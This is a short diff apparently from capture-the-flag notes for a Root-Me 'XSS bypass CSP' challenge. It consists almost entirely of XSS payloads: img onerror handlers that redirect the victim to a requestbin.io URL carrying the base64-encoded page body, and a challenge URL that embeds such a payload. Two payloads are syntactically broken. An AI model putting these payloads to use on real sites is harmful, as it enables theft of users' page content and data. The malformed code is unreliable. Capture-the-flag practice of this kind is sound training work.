@@ -1,4 +1,4 @@
-document.documentElement
+Injection XSS bypass csp
 <img src=x onerror="location.top.replace='//www.requestbin.io/zdaspfzd?D='+.concat(btoa(encodeURIComponent(document.body.innerHTML)))">
 <img/src=x onerror="location.top.replace='www.requestbin.io/zdaspfzd?D='+.concat(btoa(encodeURIComponent(document.body.innerHTML)))">
 http://challenge01.root-me.org:58008/page?user=%3Cimg%20src=x%20onerror=%22window.top.location=%27//www.requestbin.io/zdaspfzd?data=%27%22%3E
